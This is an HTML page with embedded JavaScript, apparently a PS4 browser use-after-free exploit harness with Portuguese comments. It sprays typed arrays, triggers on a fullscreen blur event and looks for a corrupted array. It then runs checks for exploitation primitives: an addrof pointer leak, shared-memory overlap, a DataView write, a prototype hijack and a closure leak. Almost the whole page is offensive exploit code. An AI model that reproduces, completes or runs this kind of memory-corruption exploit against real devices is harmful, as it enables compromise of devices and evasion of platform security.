<!DOCTYPE html>
<html>
<body>
    <h1>PS4 UAF - Debugger Core</h1>
    <button onclick="run()">EXECUTAR TESTE</button>
    <div id="c"></div>

    <script>
        // Funções de conversão exatas do Auto-Diagnóstico v2.1
        function h2f(hex) {
            let clean = hex.replace(/0x/g, '');
            let hi = parseInt(clean.slice(0, 8), 16);
            let lo = parseInt(clean.slice(8, 16), 16);
            let b = new ArrayBuffer(8), u = new Uint32Array(b);
            u[0] = lo; u[1] = hi;
            return (new Float64Array(b))[0];
        }

        function f2h(f) {
            let b = new ArrayBuffer(8); (new Float64Array(b))[0] = f;
            let u = new Uint32Array(b);
            return "0x" + u[1].toString(16).padStart(8, '0') + u[0].toString(16).padStart(8, '0');
        }

        // Padrões de sanidade validados
        const P_A = h2f("0x4141414141414141");
        const M_V = h2f("0xdeadbeefcafebabe");
        const W_V = h2f("0x1337133713371337");

        function log(tag, status, msg) {
            document.getElementById('c').innerHTML += `[${tag}] ${status} - ${msg}<br>`;
        }

        function run() {
            log("INIT", "INFO", "Criando 5000 Float64Arrays...");
            let ctrls = [];
            for(let i = 0; i < 5000; i++) {
                let a = new Float64Array(8); a[0] = i; ctrls.push(a);
            }

            log("WAIT", "INFO", "Entre em Fullscreen e aperte OPTIONS.");
            document.documentElement.webkitRequestFullscreen();

            window.onblur = function() {
                log("TRIG", "INFO", "Blur detectado. Iniciando Spray...");
                
                let targetObj = { "leak": 0x1337 };
                let spray = [];
                for(let i = 0; i < 8000; i++) {
                    let s = new Float64Array(8); s.fill(P_A); spray.push(s);
                }

                // IDENTIFICAÇÃO DO UAF (PRIORIDADE)
                let corr = null;
                for(let i = 0; i < ctrls.length; i++) {
                    if (ctrls[i][0] === P_A) {
                        corr = ctrls[i];
                        log("UAF", "PASS", `Index: ${i}`);
                        break;
                    }
                }

                if (corr) {
                    // TESTE 5: addrof() PRIMITIVE (EXECUTADO PRIMEIRO)
                    try {
                        let leaker = Array.from(corr); // Bypass validado
                        leaker[0] = targetObj; 
                        let addr = f2h(corr[0]); 
                        if (addr !== "0x0000000000000000" && addr !== f2h(P_A)) {
                            log("TEST5", "PASS", `addrof(targetObj) = ${addr}`);
                        } else {
                            log("TEST5", "FAIL", "Ponteiro não capturado.");
                        }
                    } catch(e) { log("TEST5", "ERR", e.message); }

                    // TESTE 1: IDENTIDADE (MEMÓRIA COMPARTILHADA)
                    corr[4] = M_V;
                    let found = false;
                    for(let i = 0; i < spray.length; i++) {
                        if (spray[i][4] === M_V) {
                            log("TEST1", "PASS", `Identity: corr[4] == spray[${i}][4] (${f2h(M_V)})`);
                            found = true; break;
                        }
                    }
                    if(!found) log("TEST1", "FAIL", "Identidade não encontrada.");

                    // TESTE 2: DATAVIEW WRITE
                    try {
                        const dv = new DataView(corr.buffer);
                        const before = f2h(corr[0]);
                        dv.setUint32(0, 0x13371337, true); 
                        const after = f2h(corr[0]);
                        if (before !== after) log("TEST2", "PASS", `DataView Write: ${before} -> ${after}`);
                    } catch(e) { log("TEST2", "ERR", e.message); }

                    // TESTE 3: PROTOTYPE HIJACK
                    try {
                        let reg = Array.from(corr); 
                        Object.setPrototypeOf(reg, { t: 0x1337 });
                        if (reg.t === 0x1337) log("TEST3", "PASS", "Prototype Hijack: Token 0x1337 injetado.");
                    } catch(e) { log("TEST3", "ERR", e.message); }

                    // TESTE 4: CLOSURE LEAK
                    try {
                        const leak = [0].map(() => corr[0])[0];
                        log("TEST4", "PASS", `Closure Leak: Val: ${f2h(leak)}`);
                    } catch(e) { log("TEST4", "ERR", e.message); }

                } else {
                    log("UAF", "FAIL", "Corrupção não atingida.");
                }
            };
        }
    </script>
</body>
</html>
